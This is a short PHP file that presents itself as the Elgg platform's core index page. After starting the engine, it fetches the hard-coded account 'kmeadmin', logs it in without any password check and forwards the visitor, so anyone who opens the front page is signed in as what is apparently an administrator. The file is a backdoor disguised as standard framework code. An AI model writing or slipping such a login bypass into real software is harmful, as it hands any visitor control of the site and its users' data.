<?php
/**
 * Elgg index page for web-based applications
 *
 * @package Elgg
 * @subpackage Core
 */

/**
 * Start the Elgg engine
 */
require_once(dirname(__FILE__) . "/engine/start.php");

$usrname = 'kmeadmin';
$user = get_user_by_username($usrname);
if($user){
	$login = login($user);
	forward();
}